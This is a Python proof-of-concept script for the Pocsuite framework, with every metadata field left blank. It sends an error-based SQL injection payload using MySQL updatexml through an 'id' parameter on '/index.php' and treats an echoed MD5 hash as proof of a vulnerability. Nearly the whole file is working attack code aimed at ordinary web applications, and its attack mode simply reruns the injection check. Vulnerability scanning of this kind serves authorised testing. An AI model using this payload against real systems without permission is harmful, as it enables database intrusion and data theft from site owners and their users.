#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import register,Output, POCBase
from pocsuite.thirdparty.guanxing import  parse_ip_port, http_packet, make_verify_url

class TestPOC(POCBase):
	vulID = ''''''
	cveID = ''''''
	cnvdID = ''''''
	cnnvdID = ''''''
	version = ''''''
	author = ''''''
	vulDate = ''''''
	createDate = ''''''
	updateDate = ''''''
	name = ''''''
	desc = ''''''
	solution = ''''''
	severity = '''''' 
	vulType = ''''''
	taskType = ''''''
	references = ['''''']
	appName = ''''''
	appVersion = ''''''
	appPowerLink = ''''''
	samples = ['']
	install_requires = ['''''']

	def _verify(self):
		self.url,ip,port = parse_ip_port(self.target,80)
		result = {}
		headers = {
			'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'
		}
		path = "/index.php?id=1 and updatexml(1,concat(0x7e,md5(123),0x7e),1)"
		vul_url = make_verify_url(self.url, path, mod=0) #生成完整路径
		resp = req.get(vul_url, headers = headers, verify = False, allow_redirects = False, timeout = 10) 
		if resp.status_code == 200 and '202cb962ac59075b964b07152d234b70' in resp.content: #判断条件
			result['VerifyInfo'] = http_packet(resp)
			result['VerifyInfo']['URL'] = vul_url
			result['VerifyInfo']['port'] = port
		return self.parse_output(result)


	def _attack(self):
		return self._verify()


	def parse_output(self, result):
		#parse output
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Failed')
		return output


register(TestPOC)